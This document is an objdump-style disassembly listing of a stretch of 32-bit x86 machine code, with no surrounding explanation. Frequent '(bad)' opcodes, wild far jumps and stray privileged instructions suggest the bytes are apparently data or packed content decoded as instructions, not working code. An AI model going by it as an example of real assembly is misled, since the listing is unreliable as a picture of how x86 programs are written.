  43161c:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  431622:	(bad)  
  431623:	(bad)  
  431624:	in     al,0xff
  431626:	add    BYTE PTR [ebp+0x0],al
  431629:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  43162f:	add    al,bh
  431631:	(bad)  
  431632:	jmp    0x8d85:0x74b0558d
  431639:	dec    DWORD PTR [eax]
  43163b:	call   DWORD PTR [ebp-0x7b]
  43163e:	mov    edi,esi
  431640:	lock call DWORD PTR [ebp-0x75]
  431644:	mov    esi,esp
  431646:	mov    ah,0xc6
  431648:	mov    bh,0xc3
  43164a:	mov    DWORD PTR [ebx-0x110003c4],ecx
  431650:	add    DWORD PTR [eax],0x450050ff
  431656:	mov    DWORD PTR [ebx+0x9598cc],ecx
  43165c:	inc    edi
  43165e:	push   esp
  431660:	jmp    0xcd00:0x660481ff
  431667:	mov    DWORD PTR [ebx],esi
  431669:	clc    
  43166a:	cmp    edi,0xff9cff3a
  431670:	jne    0x43167a
  431672:	mov    eax,eax
  431674:	add    esi,DWORD PTR [eax]
  431676:	int3   
  431677:	inc    ebp
  431678:	cmp    al,0x83
  43167a:	add    BYTE PTR [eax],bl
  43167c:	adc    DWORD PTR [ebx+0x768b5055],eax
  431682:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  431688:	mov    edi,eax
  43168a:	cmp    BYTE PTR [ebp+0x45],cl
  43168d:	jmp    0x43161a
  43168f:	mov    ebx,DWORD PTR [esp+ebp*8]
  431692:	inc    ebp
  431693:	or     al,0x2
  431695:	dec    DWORD PTR [ebp+0x18]
  431698:	jne    0x4316ef
  43169a:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  4316a0:	mov    edi,DWORD PTR [ebx]
  4316a2:	in     al,0x50
  4316a4:	xchg   ecx,eax
  4316a5:	jmp    0x34365aa
  4316aa:	adc    al,0x8b
  4316ac:	inc    ebp
  4316ad:	mov    al,ds:0x8b04008b
  4316b2:	push   ebp
  4316b3:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  4316b9:	push   ebp
  4316ba:	test   DWORD PTR [ebx-0x2800d701],ecx
  4316c0:	inc    ebp
  4316c1:	dec    ebp
  4316c2:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  4316c8:	mov    DWORD PTR [eax],0xe9ff00f4
  4316ce:	add    al,0x0
  4316d0:	add    BYTE PTR [eax],al
  4316d2:	mov    eax,edx
  4316d4:	push   eax
  4316d5:	rol    DWORD PTR [ebp-0xf0177],1
  4316db:	bound  eax,QWORD PTR [ebp+0x50]
  4316de:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  4316e4:	add    BYTE PTR [ecx+0x558df0ff],cl
  4316ea:	mov    al,0xf
  4316ec:	test   DWORD PTR [edx],edx
  4316ee:	call   DWORD PTR [ebp-0x7a0001]
  4316f4:	(bad)  
  4316f5:	loop   0x4316f6
  4316f7:	jnp    0xc6990afd
  4316fd:	mov    eax,ebx
  4316ff:	cmp    al,0x8b
  431701:	(bad)  
  431702:	cld    
  431703:	shr    esi,0xc
  431706:	add    dl,al
  431708:	push   eax
  431709:	lea    eax,[ebp-0x1]
  43170c:	mov    edx,esi
  43170e:	cwde   
  43170f:	cli    
  431710:	add    BYTE PTR [ebp+0x1ffff8ff],al
  431716:	or     BYTE PTR [eax],cl
  431718:	inc    ebp
  431719:	dec    ebp
  43171a:	inc    DWORD PTR [ebx+0x74803914]
  431720:	add    DWORD PTR [ebx+0x451800],ecx
  431726:	call   DWORD PTR [eax+edx*1]
  431729:	add    ecx,DWORD PTR [ebp-0x34]
  43172c:	push   edi
  43172d:	adc    al,0x8
  43172f:	mov    edx,DWORD PTR [ebp-0x14]
  431732:	mov    ecx,DWORD PTR [ebp+0x18]
  431735:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  431739:	inc    DWORD PTR [eax+esi*8]
  43173c:	inc    ebp
  43173d:	stos   BYTE PTR es:[edi],al
  43173e:	mov    edx,DWORD PTR [ebp-0x4]
  431741:	add    DWORD PTR [ebp-0x1c],eax
  431744:	mov    edx,DWORD PTR [ebp-0x70]
  431747:	cmp    eax,DWORD PTR [eax]
  431749:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43174a:	mov    eax,DWORD PTR [eax]
  43174c:	cld    
  43174d:	jae    0x4316cf
  43174f:	add    eax,DWORD PTR [ecx]
  431751:	clc    
  431752:	add    BYTE PTR [eax+0x30],dl
  431755:	mov    DWORD PTR [ecx],esi
  431757:	clc    
  431758:	pop    ds
  431759:	inc    ebp
  43175a:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  431760:	(bad)  
  431761:	push   DWORD PTR [edi]
  431763:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  431769:	(bad)  
  43176a:	jae    0x43176b
  43176c:	mov    eax,DWORD PTR [ebp-0x740175]
  431772:	sub    eax,DWORD PTR [eax]
  431774:	add    eax,DWORD PTR [eax]
  431776:	mov    DWORD PTR [ecx+0x5f],eax
  431779:	mov    DWORD PTR [ebx-0x4],ebx
  43177c:	ret    0xff
  43177f:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  431785:	ret    
  431786:	mov    eax,DWORD PTR [ebp-0x6f0075]
  43178c:	add    BYTE PTR [ebp-0x7d],al
  43178f:	mov    DWORD PTR [eax],eax
  431791:	add    al,0x84
  431793:	inc    DWORD PTR [ecx]
  431795:	lea    eax,[eax]
  431797:	hlt    
  431798:	sar    bh,cl
  43179a:	test   BYTE PTR [eax+0x1],dl
  43179d:	inc    ebp
  43179e:	add    BYTE PTR [ebx],dh
  4317a0:	test   BYTE PTR [ebx],0x84
  4317a3:	push   eax
  4317a4:	add    BYTE PTR [ebp+0x0],al
  4317a7:	add    eax,0x86
  4317ac:	add    BYTE PTR [ebx-0x7f7b0340],cl
  4317b2:	add    BYTE PTR [ecx],al
  4317b4:	add    BYTE PTR [eax],al
  4317b6:	mov    esi,0x550030
  4317bb:	mov    ecx,DWORD PTR [edi]
  4317bd:	cld    
  4317be:	fidiv  DWORD PTR [ebp+0x0]
  4317c1:	mov    edi,DWORD PTR [ecx]
  4317c3:	xor    BYTE PTR [eax+eax*1],0x84
  4317c7:	add    eax,DWORD PTR [eax]
  4317c9:	sbb    BYTE PTR [eax],al
  4317cb:	jne    0x43177e
  4317cd:	mov    eax,DWORD PTR [ecx]
  4317cf:	sbb    BYTE PTR [eax],al
  4317d1:	mov    DWORD PTR [ebp-0x1],esp
  4317d4:	add    BYTE PTR [eax+0x30e45ca],bh
  4317da:	ret    0xb7fc
  4317dd:	dec    ebp
  4317de:	or     al,0x89
  4317e0:	dec    ebp
  4317e1:	cld    
  4317e2:	cmovne ecx,DWORD PTR [eax-0x75]
  4317e6:	add    edi,esp
  4317e8:	seto   BYTE PTR [esi-0x72ffffff]
  4317ef:	inc    ebp
  4317f0:	adc    al,0x8b
  4317f2:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  4317f9:	cmp    DWORD PTR [edi+0x72],edx
  4317fc:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  431802:	gs cmp al,0x0
  431805:	je     0x4317dd
  431807:	push   eax
  431808:	sar    BYTE PTR [eax],1
  43180a:	mov    bh,0x3e
  43180c:	push   cs
  43180d:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  431813:	add    DWORD PTR [ecx+0x12],ebp
  431816:	dec    edx
  431817:	(bad)  
  431818:	mov    eax,edx
  43181a:	in     al,dx
  43181b:	adc    DWORD PTR [ecx],esi
  43181d:	pop    esi
  43181e:	inc    ecx
  43181f:	leave  
  431820:	or     DWORD PTR [eax],ebx
  431822:	gs push ebp
  431824:	add    ah,ch
  431826:	into   
  431827:	in     al,dx
  431828:	enter  0xb756,0xf0
  43182c:	push   cs
  43182d:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  431837:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  43183d:	jnp    0x74439d45
  431843:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  431849:	add    BYTE PTR [edi],cl
  43184b:	mov    edi,DWORD PTR [ecx-0x78]
  43184e:	ltr    WORD PTR [ecx-0x7b]
  431852:	dec    DWORD PTR [edi]
  431854:	clc    
  431855:	out    0x45,eax
  431857:	add    BYTE PTR [eax],cl
  431859:	cmp    ebx,0xffffff8c
  43185c:	jge    0x43185e
  43185e:	jb     0x431870
  431860:	je     0x5218e0
  431866:	pop    edx
  431867:	push   esi
  431868:	mov    ecx,DWORD PTR [edi]
  43186a:	in     al,dx
  43186b:	rol    DWORD PTR [ebp+0x0],1
  43186e:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  431875:	cmp    DWORD PTR [ecx],0xfffffff0
  431878:	hlt    
  431879:	mov    esp,DWORD PTR [eax+0xf034d2b]
  43187f:	(bad)  
  431881:	push   eax
  431882:	jns    0xb842fd00
  431888:	lock push cs
  43188a:	ror    edx,0x3
  43188d:	test   BYTE PTR [ecx+0x5500e800],cl
  431893:	dec    eax
  431894:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  431898:	(bad)  
  431899:	mov    esi,0x7f33ff5f
  43189e:	inc    eax
  43189f:	test   DWORD PTR [edx],eax
  4318a1:	je     0x431863
  4318a3:	mov    ecx,ecx
  4318a5:	adc    DWORD PTR [ebp-0xc],0xffffffec
  4318a9:	and    eax,DWORD PTR [eax+0xf0103]
  4318af:	jp     0x43189d
  4318b1:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  4318b5:	add    edx,DWORD PTR [edi+0x74]
  4318b8:	sbb    BYTE PTR [ebp+0x4d001484],cl
  4318be:	add    BYTE PTR [ebp-0x74c48bbb],al
  4318c4:	je     0x431849
  4318c6:	cmp    eax,edi
  4318c8:	js     0x4318ed
  4318ca:	add    eax,0xeb0fc003
  4318cf:	jns    0x43185c
  4318d1:	vmread DWORD PTR [ecx+0x45],ebx
  4318d5:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  4318db:	adc    al,0x8b
  4318dd:	jge    0x4318f3
  4318df:	mov    edi,DWORD PTR [eax-0x4]
  4318e2:	add    edi,DWORD PTR [edi]
  4318e4:	or     bh,bh
  4318e6:	push   ebp
  4318e7:	push   es
  4318e8:	mov    DWORD PTR [ebp-0x4],ebx
  4318eb:	add    edi,esi
  4318ed:	pop    es
  4318ee:	add    esi,DWORD PTR [edi-0x48ccf183]
  4318f4:	mov    DWORD PTR [esp+esi*8],ecx
  4318f7:	inc    ebp
  4318f8:	pop    ebp
  4318f9:	xor    DWORD PTR [esi-0x4],0x3b
  4318fd:	add    edx,DWORD PTR [ecx+edi*1]
  431900:	push   es
  431901:	clc    
  431902:	mov    bh,0xdb
  431904:	jp     0x4318bd
  431906:	add    cl,BYTE PTR [esi]
  431908:	div    DWORD PTR [edi+0x4d8b0c1c]
  43190e:	test   edi,edi
  431910:	je     0x431906
  431912:	mov    eax,ecx
  431914:	or     BYTE PTR [ebx],al
  431916:	dec    BYTE PTR [ecx+0x7d3bec7d]
  43191c:	jbe    0x431990
  43191e:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  431924:	add    ecx,DWORD PTR [esi]
  431926:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  43192c:	add    eax,DWORD PTR [ebx-0x287af783]
  431932:	je     0x431981
  431934:	mov    DWORD PTR [ecx],edi
  431936:	mov    esi,eax
  431938:	hlt    
  431939:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  431940:	jb     0x431902
  431942:	jmp    0x43192f
  431944:	xor    esi,DWORD PTR [ebx]
  431946:	pop    edi
  431947:	pop    esi
  431948:	pop    ebx
  431949:	ret    
  43194a:	ret    0x8b
  43194d:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  431953:	xor    DWORD PTR ds:0x89339c0c,0x56
  43195a:	cld    
  43195b:	cmp    DWORD PTR [ebp+0xf],eax
  43195e:	xor    al,0x85
  431960:	pushf  
  431961:	add    BYTE PTR [ebx+0x4d0cfc8b],cl
  431967:	ret    
  431968:	mov    edi,DWORD PTR [esi-0x4]
  43196b:	pop    eax
  43196c:	dec    ebp
  43196d:	jne    0x4318fa
  43196f:	xor    edi,esp
  431971:	inc    eax
  431972:	dec    ebp
  431973:	jbe    0x4319c8
  431975:	inc    eax
  431976:	pop    ebp
  431977:	add    edx,DWORD PTR [esi+0x8]
  43197a:	push   ebx
  43197b:	dec    eax
  43197c:	push   ecx
  43197d:	mov    eax,edi
  43197f:	and    al,0xf0
  431981:	jo     0x43196e
  431983:	mov    eax,DWORD PTR [ebx]
  431985:	sbb    BYTE PTR [ebp+0x4d],cl
  431988:	mov    eax,DWORD PTR [ebx]
  43198a:	nop
  43198b:	or     BYTE PTR [eax],al
  43198d:	jne    0x4319e6
  43198f:	cmp    ebx,DWORD PTR [edx+0x33893277]
  431995:	cld    
  431996:	xor    edi,edi
  431998:	add    edi,DWORD PTR [ebp+0x3]
  43199b:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  4319a1:	js     0x431927
  4319a3:	jae    0x4319a7
  4319a5:	(bad)  
  4319a7:	xor    al,0x5d
  4319a9:	jmp    0x431936
  4319ab:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  4319b2:	fdecstp 
  4319b4:	test   BYTE PTR [edi],ah
  4319b6:	add    bh,BYTE PTR [ebp+0x0]
  4319b9:	add    ebx,DWORD PTR [ebp-0x77]
  4319bc:	mov    edi,eax
  4319be:	cmp    al,0x0
  4319c1:	adc    dh,BYTE PTR [ebx]
  4319c3:	jge    0x4319c8
  4319c5:	mov    edi,DWORD PTR [ebx]
  4319c7:	jl     0x4319d8
  4319c9:	clc    
  4319ca:	dec    edi
  4319cb:	jge    0x4319cd
  4319cd:	mov    eax,DWORD PTR [ebx]
  4319cf:	jb     0x4319d9
  4319d1:	mov    ecx,DWORD PTR [ebp-0x8]
  4319d4:	mov    edi,edi
  4319d6:	xor    edx,DWORD PTR [eax]
  4319d8:	add    edi,DWORD PTR [ebx]
  4319da:	mov    DWORD PTR [ebp-0x10],edi
  4319dd:	inc    edi
  4319de:	pop    ebp
  4319df:	jge    0x431a1c
  4319e1:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  4319e5:	mov    edx,0xc05d87f0
  4319ea:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  4319ee:	fimul  WORD PTR [eax]
  4319f0:	fist   WORD PTR [ebp+0x1c]
  4319f3:	in     al,dx
  4319f4:	jne    0x4319e2
  4319f6:	mov    edi,DWORD PTR [edx-0x7a27a10]
  4319fc:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  431a00:	fdivp  st(0),st
  431a02:	fild   WORD PTR [ebp+0x4510f85c]
  431a08:	test   BYTE PTR [ebx+0x4d00fc02],cl
  431a0e:	inc    ebp
  431a0f:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  431a15:	mov    ebp,DWORD PTR [ebx-0x4]
  431a18:	adc    al,0x8b
  431a1a:	rcl    DWORD PTR [eax],0x48
  431a1d:	mov    esi,0x7080803
  431a22:	fiadd  WORD PTR [ebp+0x4d]
  431a25:	(bad)  
  431a26:	mov    edx,DWORD PTR [edx-0x4]
  431a29:	mov    edx,DWORD PTR [ebp-0x4]
  431a2c:	xor    ebx,DWORD PTR [ebx+0x330103]
  431a32:	mov    DWORD PTR [edi+0x872dc],edi
  431a38:	xlat   BYTE PTR ds:[ebx]
  431a39:	into   
  431a3a:	ffreep st(6)
  431a3c:	retf   0x6c7
  431a3f:	iret   
  431a40:	dec    ebp
  431a41:	inc    ebp
  431a42:	mov    DWORD PTR [ebx],edi
  431a44:	fmul   QWORD PTR [edi]
  431a46:	dec    ebp
  431a47:	jnp    0x431a7c
  431a49:	add    BYTE PTR [ebx],al
  431a4b:	mov    ecx,DWORD PTR [esp+edi*8]
  431a4e:	inc    ebp
  431a4f:	dec    ebp
  431a50:	lea    esi,[ebx]
  431a52:	add    DWORD PTR [ebx],eax
  431a54:	jb     0x431a91
  431a56:	add    BYTE PTR [edi],cl
  431a58:	inc    ebp
  431a59:	imul   eax,edi,0x858bd800
  431a5f:	cld    
  431a60:	clc    
  431a61:	mov    DWORD PTR [ebp+0x0],eax
  431a64:	inc    DWORD PTR [eax]
  431a66:	or     al,0xde
  431a68:	sbb    bh,0x1
  431a6b:	retf   
  431a6c:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  431a73:	dec    ebp
  431a74:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  431a7a:	enter  0x12de,0xdf
  431a7e:	inc    ebp
  431a7f:	pop    ebp
  431a80:	dec    DWORD PTR [ebx-0x257f0ff4]
  431a86:	add    DWORD PTR [edx],edx
  431a88:	add    BYTE PTR [ebp+0x50],dl
  431a8b:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  431a91:	xor    ecx,DWORD PTR [ebx+eax*1+0xac73966]
  431a98:	loopne 0x431ab1
  431a9a:	cdq    
  431a9b:	push   ebp
  431a9c:	clc    
  431a9d:	mov    eax,DWORD PTR [ebp-0x4]
  431aa0:	xor    edx,edx
  431aa2:	add    esi,DWORD PTR [ebx]
  431aa4:	cmp    eax,DWORD PTR [ebx]
  431aa6:	hlt    
  431aa7:	cmp    DWORD PTR [ebx],esp
  431aa9:	or     al,BYTE PTR [ebp+0xf]
  431aac:	mov    eax,DWORD PTR [edx]
  431aae:	loopne 0x431ab0
  431ab0:	(bad)  
  431ab1:	mov    ecx,esi
  431ab3:	cld    
  431ab4:	pushf  
  431ab5:	pop    ebp
  431ab6:	call   0x10c0:0x8bf0328b
  431abd:	add    eax,DWORD PTR [eax+0x10018b]
  431ac3:	dec    ebp
  431ac4:	iret   
  431ac5:	xor    ebp,DWORD PTR [edi+0x50e45189]
  431acb:	dec    ebp
  431acc:	mov    ecx,DWORD PTR [ebx-0x31390304]
  431ad2:	(bad)  
  431ad3:	iret   
  431ad4:	inc    ebp
  431ad5:	(bad)  
  431ad6:	jne    0x431b25
  431ad8:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  431ade:	(bad)  
  431adf:	cmp    ebx,eax
  431ae1:	je     0x431a69
  431ae3:	add    edi,edi
  431ae5:	or     bh,bh
  431ae7:	dec    ebp
  431ae8:	inc    ebp
  431ae9:	mov    esi,DWORD PTR [ebx]
  431aeb:	cld    
  431aec:	add    ecx,esi
  431aee:	cmp    ecx,DWORD PTR [eax-0xc]
  431af1:	mov    edx,DWORD PTR [edi]
  431af3:	or     BYTE PTR [ebp-0x7c],al
  431af6:	mov    ebx,DWORD PTR [edx-0x7639cd18]
  431afc:	test   BYTE PTR [edx+ebx*4],cl
  431aff:	inc    ebp
  431b00:	xor    bh,BYTE PTR [eax]
  431b02:	mov    DWORD PTR [eax+ebp*8+0x10ef8b],ebx
  431b09:	jne    0x431ad2
  431b0b:	mov    ebp,esp
  431b0d:	fcomp  DWORD PTR [ebx]
  431b0f:	add    BYTE PTR [ecx],al
  431b11:	inc    DWORD PTR [ebp-0x75]
  431b14:	(bad)  
  431b15:	cld    
  431b16:	add    al,0xce
  431b18:	mov    ecx,edi
  431b1a:	cld    
  431b1b:	inc    ebp
  431b1c:	fidivr WORD PTR [ebx]
  431b1e:	fbstp  TBYTE PTR [ebp-0x3e]
  431b21:	mov    eax,DWORD PTR [eax]
  431b23:	adc    BYTE PTR [ebx-0x3974038b],cl
  431b29:	fadd   st,st(7)
  431b2b:	add    BYTE PTR [ebp-0x1],al
  431b2e:	mov    ecx,DWORD PTR [esp+edi*8]
  431b31:	inc    ebp
  431b32:	mov    bh,0xc7
  431b35:	loopne 0x431b7c
  431b37:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  431b3d:	sbb    al,0x33
  431b3f:	pushf  
  431b40:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  431b46:	mov    eax,edi
  431b48:	cwde   
  431b49:	inc    ebp
  431b4a:	inc    ebp
  431b4b:	jne    0x431ad8
  431b4d:	mov    esp,esp
  431b4f:	clc    
  431b50:	add    al,0x4d
  431b52:	mov    DWORD PTR [ebx],esi
  431b54:	or     al,0x33
  431b56:	inc    ebp
  431b57:	lea    ecx,[ebx-0x398d13fd]
  431b5d:	add    bh,al
  431b5f:	inc    ebp
  431b60:	ror    DWORD PTR [ebx+0x45d829],0x8b
  431b67:	add    ebp,esp
  431b69:	shufps xmm1,xmm3,0xc7
  431b6d:	(bad)  
  431b6e:	jmp    0x74885697
  431b73:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  431b79:	hlt    
  431b7a:	mov    ecx,DWORD PTR [edi]
  431b7c:	fadd   DWORD PTR [ebp+0x0]
  431b7f:	xor    ecx,DWORD PTR [edi]
  431b81:	add    ecx,ecx
  431b83:	cmp    edi,edi
  431b85:	pmuludq mm7,QWORD PTR [edx+0x50]
  431b89:	(bad)  
  431b8a:	jmp    0x431b17
  431b8c:	mov    edi,esp
  431b8e:	or     al,0xc6
  431b90:	inc    ebp
  431b91:	(bad)  
  431b92:	mov    eax,DWORD PTR [ebp+0x10]
  431b95:	jne    0x431b20
  431b97:	mov    eax,DWORD PTR [ecx]
  431b99:	clc    
  431b9a:	add    BYTE PTR [ebp-0x40],cl
  431b9d:	xor    edx,DWORD PTR [eax-0x73]
  431ba0:	jne    0x431ba3
  431ba2:	push   DWORD PTR [edx+0x8]
  431ba5:	add    BYTE PTR [ebp+0x45],al
  431ba8:	mov    ebp,ecx
  431baa:	cld    
  431bab:	add    BYTE PTR [ebp+0x0],cl
  431bae:	xor    eax,DWORD PTR [ebp+0x3]
  431bb1:	lea    edi,[ebx]
  431bb3:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  431bb9:	sub    eax,0x5d330e4d
  431bbe:	lea    esi,[ebx]
  431bc0:	add    DWORD PTR [ebx],eax
  431bc2:	jb     0x431bad
  431bc4:	add    BYTE PTR [eax],al
  431bc6:	inc    ebp
  431bc7:	add    bl,ch
  431bc9:	inc    ebp
  431bca:	mov    esi,DWORD PTR [ebx]
  431bcc:	or     al,0x3
  431bce:	(bad)  
  431bcf:	mov    edi,eax
  431bd1:	in     al,dx
  431bd2:	scas   eax,DWORD PTR es:[edi]
  431bd3:	inc    ebp
  431bd4:	mov    esi,DWORD PTR [ebx]
  431bd6:	in     al,0x3
  431bd8:	add    al,0x89
  431bda:	mov    ecx,DWORD PTR [eax+edi*8]
  431bdd:	dec    ebp
  431bde:	(bad)  
  431bdf:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3166]
  431be6:	mov    ecx,eax
  431be8:	cld    
  431be9:	push   es
  431bea:	dec    ebp
  431beb:	add    al,0x33
  431bed:	mov    DWORD PTR [ebx],eax
  431bef:	in     al,dx
  431bf0:	cmp    DWORD PTR [ebp-0x67],eax
  431bf3:	mov    eax,DWORD PTR [ebp-0xba0068]
  431bf9:	mov    edx,DWORD PTR [ebp-0x4]
  431bfc:	mov    ecx,DWORD PTR [ebp-0x2c]
  431bff:	xor    eax,DWORD PTR [ebp+0x3]
  431c02:	cmp    DWORD PTR [ebx],0x8b327499
  431c08:	xor    edi,esp
  431c0a:	jmp    0xff77195c
  431c0f:	add    ecx,DWORD PTR [ebp-0x3f]
  431c12:	xor    ebx,DWORD PTR [edi]
  431c14:	add    eax,ecx
  431c16:	cmp    ebx,DWORD PTR [eax]
  431c18:	mov    ecx,DWORD PTR [ebp-0x4]
  431c1b:	mov    ecx,DWORD PTR [eax]
  431c1d:	adc    BYTE PTR [ebp-0x80],al
  431c20:	jmp    0x431c23
  431c22:	mov    eax,DWORD PTR [eax]
  431c24:	cld    
  431c25:	mov    bh,0xc6
  431c27:	push   ecx
  431c28:	(bad)  
  431c29:	jne    0x431c89
  431c2b:	dec    ecx
  431c2d:	or     BYTE PTR [ecx+ebx*1],cl
  431c30:	push   ebp
  431c31:	inc    ebp
  431c32:	in     al,dx
  431c33:	add    ebp,esp
  431c35:	or     bh,al
  431c37:	dec    ebp
  431c38:	cld    
  431c39:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  431c3f:	xor    DWORD PTR [edx+eax*1],0xffffff9c
  431c43:	dec    DWORD PTR [ebx+0x45510cf4]
  431c49:	mov    DWORD PTR [ebx+0x5345fc0c],ecx
  431c4f:	mov    edx,DWORD PTR [ecx+0xc]
  431c52:	xor    eax,esi
  431c54:	mov    edx,0xc172c7
  431c59:	inc    ebp
  431c5a:	mov    esi,DWORD PTR [ebp+0x8]
  431c5d:	mov    eax,edx
  431c5f:	call   0x84c7e354
  431c64:	add    DWORD PTR [edx-0x76bace00],ebx
  431c6a:	mov    ebp,eax
  431c6c:	or     BYTE PTR [eax],dl
  431c6e:	jo     0x431cbd
  431c70:	push   edi
  431c71:	xor    esi,DWORD PTR [ebp+0x3]
  431c74:	(bad)  
  431c75:	pmulhuw mm0,mm1
  431c78:	test   DWORD PTR [ebp-0x8],ecx
  431c7b:	mov    DWORD PTR [ebp-0x67],eax
  431c7e:	mov    eax,DWORD PTR [ebp-0x4]
  431c81:	xor    edi,DWORD PTR [ebp-0x73]
  431c84:	xor    eax,DWORD PTR [ebx]
  431c86:	xor    esi,DWORD PTR [edx+0x3]
  431c89:	add    BYTE PTR [ecx],bh
  431c8b:	inc    ebp
  431c8c:	(bad)  
  431c8d:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  431c93:	mov    DWORD PTR [eax],0x750f0004
  431c99:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  431c9f:	lock add BYTE PTR [ebp+0x0],cl
  431ca3:	mov    esi,DWORD PTR [ebp-0x18]
  431ca6:	mov    ebp,edx
  431ca8:	or     al,0x72
  431caa:	ja     0x431cac
  431cac:	mov    edx,esi
  431cae:	cld    
  431caf:	(bad)  
  431cb2:	cli    
  431cb3:	mov    esi,DWORD PTR [ebp-0x4]
  431cb6:	cmp    ecx,esi
  431cb8:	bswap  edi
  431cba:	(bad)
  431cbe:	mov    esi,DWORD PTR [ebp-0x4]
  431cc1:	mov    esi,ecx
  431cc3:	clc    
  431cc4:	repnz add esi,DWORD PTR [ebp+0x45]
  431cc8:	push   ebx
  431cc9:	xor    eax,DWORD PTR [ebp+0x3]
  431ccc:	cmp    bl,BYTE PTR [edi-0x64]
  431ccf:	pop    ebx
  431cd0:	jmp    0x431d97
  431cd5:	mov    esi,DWORD PTR [ebp-0x7d]
  431cd8:	xor    ebp,DWORD PTR [eax]
  431cda:	lea    eax,[ebp-0x8]
  431cdd:	xor    eax,0xc7ef9cf2
  431ce2:	neg    eax
  431ce4:	ins    DWORD PTR es:[edi],dx
  431ce5:	test   esi,edi
  431ce7:	clc    
  431ce8:	pop    esp
  431ce9:	inc    ebp
  431cea:	or     BYTE PTR [ecx+0x450f0c7d],cl
  431cf0:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  431cf6:	add    cl,al
  431cf8:	jne    0x431c94
  431cfa:	mov    esi,DWORD PTR [edx]
  431cfc:	in     al,dx
  431cfd:	push   esi
  431cfe:	xor    BYTE PTR [ebp-0xe],dh
  431d01:	add    edi,esi
  431d03:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  431d09:	add    cl,bh
  431d0b:	mov    edi,DWORD PTR [ebp+0x8]
  431d0e:	mov    DWORD PTR [ebp-0x14],esi
  431d11:	add    esi,DWORD PTR [ebp+0x3c]
  431d14:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  431d1a:	mov    ah,0x38
  431d1c:	call   0xe0e4:0x898b329c
  431d23:	jne    0x431d9a
  431d25:	mov    ecx,DWORD PTR [ebx-0xe0e13f4]
  431d2b:	shl    edx,0xf2
  431d2e:	(bad)  
  431d2f:	mov    ah,0x16
  431d31:	dec    eax
  431d32:	jne    0x431cc7
  431d34:	mov    ecx,DWORD PTR [edi]
  431d36:	in     al,dx
  431d37:	jmp    0x431d2a
  431d39:	add    dl,dh
  431d3b:	mov    edi,esi
  431d3d:	or     al,0x8
  431d3f:	inc    ebp
  431d40:	jne    0x431d45
  431d42:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  431d48:	ret    
  431d49:	or     bh,bh
  431d4b:	jge    0x431d35
  431d4d:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  431d53:	xor    edi,eax
  431d55:	add    esi,DWORD PTR [ebp-0x77]
  431d58:	mov    ebx,esp
  431d5a:	clc    
  431d5b:	neg    DWORD PTR [ebp-0x7c]
  431d5e:	xor    eax,DWORD PTR [eax]
  431d60:	cmp    eax,DWORD PTR [eax]
  431d62:	repz jne 0x431cfa
  431d65:	xor    eax,DWORD PTR [ecx]
  431d67:	add    ebx,DWORD PTR [eax]
  431d69:	mov    DWORD PTR [ebp-0x8],eax
  431d6c:	mov    eax,edi
  431d6e:	cld    
  431d6f:	lock pop eax
  431d71:	test   DWORD PTR [ebx],esi
  431d73:	clc    
  431d74:	add    edx,DWORD PTR [edi-0x740bff77]
  431d7a:	fdivp  st(4),st
  431d7c:	test   ecx,esi
  431d7e:	(bad)  
  431d7f:	jnp    0x431d80
  431d81:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  431d87:	jae    0x431d14
  431d89:	sub    edi,esp
  431d8b:	(bad)  
  431d8c:	shl    DWORD PTR [eax-0x3e],0x89
  431d90:	leave  
  431d91:	call   0x8198d49e
  431d96:	in     al,dx
  431d97:	(bad)  
  431d98:	in     al,dx
  431d99:	add    bh,al
  431d9b:	mov    esp,edi
  431d9d:	in     al,dx
  431d9e:	test   DWORD PTR [ebp-0x8],edi
  431da1:	mov    eax,DWORD PTR [ebp+0x2b]
  431da4:	xor    al,0x3
  431da6:	pushf  
  431da7:	jnp    0x573219e0
  431dad:	xor    edx,DWORD PTR [ebx-0x77]
  431db0:	push   ecx
  431db1:	loopne 0x431de6
  431db3:	jne    0x431d70
